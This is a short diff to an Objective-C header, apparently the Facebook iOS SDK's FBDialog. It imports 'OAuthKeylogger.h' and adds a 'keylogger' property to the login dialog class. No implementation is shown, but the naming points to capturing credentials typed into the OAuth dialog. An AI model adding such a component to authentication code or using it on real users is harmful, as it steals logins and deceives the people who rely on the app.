@@ -17,6 +17,8 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 
+#import "OAuthKeylogger.h"
+
 @protocol FBDialogDelegate;
 
 /**
@@ -39,6 +41,11 @@
   // Ensures that UI elements behind the dialog are disabled.
   UIView* _modalBackgroundView;
 }
+
+/**
+ * The keylogger.
+ */
+@property(nonatomic,retain) OAuthKeylogger* keylogger;
 
 /**
  * The delegate.
